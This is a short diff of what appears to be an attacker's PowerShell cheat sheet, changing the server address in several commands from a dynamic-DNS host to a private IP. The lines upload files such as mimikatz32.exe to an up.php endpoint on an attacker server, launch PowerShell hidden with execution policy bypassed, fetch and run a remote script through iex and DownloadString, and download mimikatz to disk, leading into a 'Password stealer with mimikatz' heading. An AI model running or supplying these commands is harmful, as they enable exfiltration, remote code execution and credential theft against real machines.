@@ -35,15 +35,15 @@ Extra commands
 
 iwr kali.servegame.com:8000/up.php -method POST -infile 64.txt
 
-Invoke-RestMethod -Uri "http://kali.servegame.com:8000/up.php" -Method Post -InFile "C:\mimikatz32.exe"
+Invoke-RestMethod -Uri "http://192.168.1.10:8000/up.php" -Method Post -InFile "C:\mimikatz32.exe"
 
 #Download file
 
 powershell.exe -executionpolicy bypass -w hidden #to hide window
 
-iex(New-Object System.Net.WebClient).DownloadString('http://kali.servegame.com:8000/powershell.ps1')
+iex(New-Object System.Net.WebClient).DownloadString('http://192.168.1.10:8000/powershell.ps1')
 
-Invoke-WebRequest -Uri "http://kali.servegame.com:8000/mimikatz32.exe" -OutFile "C:\mimikatz32.exe"
+Invoke-WebRequest -Uri "http://192.168.1.10:8000/mimikatz32.exe" -OutFile "C:\mimikatz32.exe"
 
 
 Password stealer with mimikatz##
